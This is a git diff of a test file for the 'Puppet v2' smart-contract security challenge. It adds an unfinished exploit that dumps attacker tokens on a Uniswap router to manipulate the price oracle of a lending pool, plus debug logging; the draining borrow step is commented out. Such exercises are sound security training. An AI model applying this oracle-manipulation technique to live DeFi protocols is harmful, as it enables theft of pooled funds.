@@ -82,11 +82,29 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        // Allow us to swap
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        // Swap our DVT's for ETH -> drop the price of buying DVT's with ETH in puppetPool
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),
+            0,
+            [this.token.address,this.weth.address], //path
+            attacker.address,
+            99999999999999
+        );
+
+        //await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, { value: })
+        
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-
+        let j = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log(j);
+        console.log(await this.token.balanceOf(attacker.address))
+        console.log(await ethers.provider.getBalance(attacker.address))
         // Attacker has taken all tokens from the pool        
         expect(
             await this.token.balanceOf(this.lendingPool.address)
